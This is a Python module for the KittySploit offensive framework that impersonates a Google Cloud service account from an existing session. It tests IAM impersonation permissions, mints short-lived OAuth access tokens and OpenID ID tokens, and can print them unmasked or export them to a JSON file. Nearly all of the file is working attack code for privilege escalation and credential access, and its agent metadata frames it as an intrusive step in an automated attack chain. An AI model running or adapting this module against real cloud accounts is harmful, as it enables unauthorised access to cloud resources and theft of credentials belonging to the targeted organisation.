#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Impersonate Service Account",
        "description": "Validate and obtain short-lived credentials by impersonating a service account",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "iam", "credentials", "impersonation", "privilege-escalation"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 3,
        'reversible': True,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    service_account_email = OptString("", "Target service account email to impersonate", True)
    scopes = OptString(
        "https://www.googleapis.com/auth/cloud-platform",
        "Comma-separated OAuth scopes for the access token",
        False,
    )
    lifetime = OptString("3600s", "Access token lifetime", False)
    generate_id_token = OptBool(False, "Also generate an OpenID Connect ID token", False)
    id_token_audience = OptString("", "Audience for the ID token; defaults to cloud-platform scope URL", False)
    check_permissions = OptBool(True, "Test impersonation-related IAM permissions before token minting", False)
    mask_token = OptBool(True, "Mask tokens in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    IMPERSONATION_PERMISSIONS = [
        "iam.serviceAccounts.actAs",
        "iam.serviceAccounts.getAccessToken",
        "iam.serviceAccounts.getOpenIdToken",
        "iam.serviceAccounts.implicitDelegation",
    ]

    def run(self):
        try:
            project_id = self._gcp_project_id()
            principal = self._gcp_client_email()
            target = str(self.service_account_email or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not target:
                print_error("service_account_email is required")
                return False

            print_info(f"Impersonating {target} from {principal or 'unknown principal'}...")
            granted = []
            if self.check_permissions:
                granted = self._gcp_test_permissions(self.IMPERSONATION_PERMISSIONS, project_id)
                if granted:
                    print_success(f"Granted impersonation permissions: {', '.join(granted)}")
                else:
                    print_warning("No impersonation permissions confirmed via testIamPermissions")

            scope_list = [item.strip() for item in str(self.scopes or "").split(",") if item.strip()]
            access_result = self._gcp_generate_access_token(
                target,
                scopes=scope_list,
                lifetime=str(self.lifetime or "3600s"),
            )
            if not access_result.get("success"):
                print_error(f"Impersonation failed: {access_result.get('error', '')}")
                return False

            access_token = str(access_result.get("accessToken") or "")
            print_success("Service account impersonation succeeded")
            print_info(f"Target: {target}")
            print_info(f"Expires: {access_result.get('expireTime') or 'unknown'}")
            if access_token:
                displayed = self._gcp_mask_token(access_token) if self.mask_token else access_token
                print_info(f"Access token: {displayed}")

            id_token_result = None
            if self.generate_id_token:
                audience = str(self.id_token_audience or "").strip() or (
                    scope_list[0] if scope_list else "https://www.googleapis.com/auth/cloud-platform"
                )
                print_info(f"Generating ID token with audience {audience}...")
                id_token_result = self._gcp_generate_id_token(target, audience=audience)
                if id_token_result.get("success"):
                    token = str(id_token_result.get("token") or "")
                    displayed = self._gcp_mask_token(token) if self.mask_token else token
                    print_success("ID token generated")
                    print_info(f"ID token: {displayed}")
                else:
                    print_warning(f"ID token generation failed: {id_token_result.get('error', '')}")

            output = {
                "project_id": project_id,
                "principal": principal,
                "target": target,
                "granted_permissions": granted,
                "accessToken": access_token,
                "expireTime": access_result.get("expireTime"),
                "scopes": scope_list,
            }
            if id_token_result:
                output["idToken"] = id_token_result.get("token") if id_token_result.get("success") else None
                output["idTokenError"] = id_token_result.get("error")

            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Service account impersonation failed: {exc}")
            return False
